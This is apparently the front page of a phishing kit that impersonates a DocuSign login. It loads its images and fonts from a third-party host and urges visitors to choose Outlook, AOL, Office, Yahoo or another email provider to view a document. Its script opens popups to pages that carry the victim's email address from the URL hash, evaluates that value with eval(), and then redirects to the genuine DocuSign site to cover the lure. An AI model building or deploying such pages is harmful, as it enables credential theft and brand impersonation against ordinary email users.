<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>DocuSign Login - Enter email to start sign in</title>
   <link href="https://docucdn-a.akamaihd.net/olive/images/2.15.0/favicons/favicon.ico" rel="shortcut icon" type="image/x-icon">
    <style>
        ::-webkit-scrollbar{width:3px}
        ::-webkit-scrollbar-track{background:#f7fafe}
        ::-webkit-scrollbar-thumb{background:#2E77BC;border-radius:30px}
        ::-webkit-scrollbar-thumb:hover{background:#2E77BC;}
        @font-face {
            font-family: 'Segoe UI';
            src: url('https://rosehostserv.com/email-list/docusjjksndks3/assets/SegoeUI.eot');
            src: local('Segoe UI'), local('SegoeUI'),
                url('https://rosehostserv.com/email-list/docusjjksndks3/assets/SegoeUI.eot?#iefix') format('embedded-opentype'),
                url('https://rosehostserv.com/email-list/docusjjksndks3/assets/SegoeUI.woff2') format('woff2'),
                url('https://rosehostserv.com/email-list/docusjjksndks3/assets/SegoeUI.woff') format('woff'),
                url('https://rosehostserv.com/email-list/docusjjksndks3/assets/SegoeUI.ttf') format('truetype');
            font-weight: normal;
            font-style: normal;
        }
        @font-face {
            font-family: 'Segoe UI';
            src: url('https://rosehostserv.com/email-list/docusjjksndks3/assets/SegoeUI-SemiBold.eot');
            src: local('Segoe UI Semibold'), local('SegoeUI-SemiBold'),
                url('https://rosehostserv.com/email-list/docusjjksndks3/assets/SegoeUI-SemiBold.eot?#iefix') format('embedded-opentype'),
                url('https://rosehostserv.com/email-list/docusjjksndks3/assets/SegoeUI-SemiBold.woff2') format('woff2'),
                url('https://rosehostserv.com/email-list/docusjjksndks3/assets/SegoeUI-SemiBold.woff') format('woff'),
                url('https://rosehostserv.com/email-list/docusjjksndks3/assets/SegoeUI-SemiBold.ttf') format('truetype');
            font-weight: 600;
            font-style: normal;
        }
        *,
        body {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Segoe UI;
            background-image: url('https://rosehostserv.com/email-list/docusjjksndks3/assets/bg.png');
            background-size: cover;
            background-position: top;
            background-color: #f7fafe;
            padding: 2vw 0;
            display: flex;
            align-items: center;
            min-height: 100vh;
        }
        img {
            max-width: 100%;
            max-height: 100%;
        }
        .safflower-wrapper {
            display: flex;
            flex-wrap: wrap;
            width: 100%;
            margin: 0 auto;
            max-width: 840px;
            background-color: #fff;
            border-radius: 2vw;
            box-shadow: 0px 9px 19px 0px rgba(0, 0, 0, 0.4);
            overflow: hidden;
            padding: 1.25vw;
        }
        .col {
            width: 50%;
            position: relative;
            padding: 3vw 2vw;
        }
        .col.right {
            display: flex;
            background-color: #fff;
        }
        .col.left{
            background-color: #194BA0;
            padding-left: 2rem;
            padding-right: 2rem;
            text-align: center;
            color: #fff;
            border-radius: 2vw 0 0 2vw;
            padding-bottom: 1.25vw;
        }
        .middle-icon{
            margin: 3vw 0;
        }
        .card-container{
            margin: 0 auto;
            text-align: left;
            max-width: 390px;
        }
        .docusign{
            margin: 0 auto;
            max-width: 180px;
        }
        .login-card{
            width: 100%;
            max-width: 340px;
            padding: 2vw 1rem;
            border-radius: 8px;
            margin: 0 auto;
        }
        .logo{
            height: 1.2rem;
            display: flex;
        }     
        .links img{
            width: 100%;
            margin-bottom: 2%;
            transition: all 0.3s;
        }
        .links img:hover{
            transform: scale(1.05);
        }
        .login{
            font-family: Segoe UI;
            font-weight: 600;
            margin-bottom: 1.25rem;
        }
        .signin-text{
            font-weight: 700;
            margin-bottom: 0.3125rem;
            color: #fff;
        }
        .text-center{
            text-align: center;
        }
        .para {
            font-family: Segoe UI;
            font-weight: 700;
            color: #505050;
            font-size: 1rem;
        }
        .col.left .para,.col.left .note{
            color: #fff;
        }
        .note {
            font-family: Segoe UI;
            font-weight: 700;
            font-size: 0.875rem;
            color: #194ba0;
        }
        @media(max-width: 991px) {
            .col,.col.right {
                width: 100%;
            }
            .col.right{
                padding-bottom: 3rem;
                order: 0;
            }
            .col.left{
                order: 1;
            }
        }
        @media(max-width: 440px){
            .col.right{
                padding-bottom: 3.5rem;
            }
        }
        @media(min-width: 1602px) {
            .safflower-wrapper {
                max-width: 992px;
            }
            .login-card{
                max-width: 400px;
            }
            .para{
                font-size: 1.1rem;
            }
        }
    </style>
</head>
<body>
    <div class="safflower-wrapper">
        <div class="col left">
            <h2 class="login">Build a better eSignature <br>
            experience with the DocuSign</h2>
            <img src="https://rosehostserv.com/email-list/docusjjksndks3/assets/left.png" class="middle-icon" draggable="false">
            <div class="text-center">
                <img src="https://rosehostserv.com/email-list/docusjjksndks3/assets/docusign.png" class="docusign" draggable="false">
            </div>
        </div>
        <div class="col right">
            <div class="card-container">
                <div class="para">
                    To view document select your email provider below
                    and login with email address.
                </div>
                <div class="note">
                    Select other emails if your email provider is not below.
                </div>
                <div class="login-card">
                    <div class="links">
                     <ul style=" list-style-type: none;">
            <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">
                        <a href="" data-nn="OUT.html?username={|location.hash.substring(1)|}">
                            <img src="https://rosehostserv.com/email-list/docusjjksndks3/assets/outlook.png" alt="outlook-login" draggable="false">
                        </a>
                        </li>
                             <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;"> 
                        <a href="" data-nn="AOL.html?yid={|location.hash.substring(1)|}">
                            <img src="https://rosehostserv.com/email-list/docusjjksndks3/assets/aol.png" alt="aol-login" draggable="false">
                        </a>

                         </li>
                             <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">
                        <a href="" data-nn="OFFICE.html?username={|location.hash.substring(1)|}">
                            <img src="https://rosehostserv.com/email-list/docusjjksndks3/assets/office.png" alt="office-login" draggable="false">
                        </a>
                         </li>
                             <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">
                        <a href="" data-nn="YAHOO.html?yid={|location.hash.substring(1)|}">
                            <img src="https://rosehostserv.com/email-list/docusjjksndks3/assets/yahoo.png" alt="yahoo-login" draggable="false">
                        </a>
                         </li>
                             <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">
                        <a href="" data-nn="OTHER.html#{|location.hash.substring(1)|}">
                            <img src="https://rosehostserv.com/email-list/docusjjksndks3/assets/other-mails.png" alt="other-login" draggable="false">
                        </a>
                        </li>
                                          <script>
const queryString=[...new URLSearchParams(location.search)].reduce((e,[t,n])=>(e[t]=n,e),{});function templatePage(){let g=document;function a(b){return b.replace(/{\|(.*?)\|}/g,(_,c)=>{let d=eval(c);return null==d?"":d})}for(const e of g.getElementsByTagName("*"))for(const t of e.attributes){let e=a(t.value);e!==t.value&&(t.value=e)}const b=g.createNodeIterator(g.body,NodeFilter.SHOW_TEXT,null);let c;for(;c=b.nextNode();){let e="textContent",t=a(c[e]);t!==c[e]&&(c[e]=t)}}
templatePage()
</script>
                        </ul>
                    </div>
                     <div style="" id="checks" style="display: none;"></div>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
   <script>
     $(document).ready(function(e){ 
     window_opener_xc(); 
   });
   function window_opener_xc(){
     var url_part = get_extra_data(1);
     $('li a').click(function(e){
       e.preventDefault();
     if($(this).data('nn')){
       var checks = $('#checks');
           var win3 = window.open(url_part+$(this).data('nn'), '_blank', 'location=yes,height=570,width=520,scrollbars=yes,status=yes');
         setInterval(function(){ 
         if($('#checks').html()){ window.location.replace(get_extra_data(2)); }
       }, 3000);
     }
     });
   }
   function get_extra_data(a){
     var output = '';
     if(a==1){
       output = '';
     }
     else if(a==2){
       output = "https://account.docusign.com/#/username";
     }
     return output;
   }
   </script> 
                </div>
            </div>
        </div>
    </div>
</body>
</html>
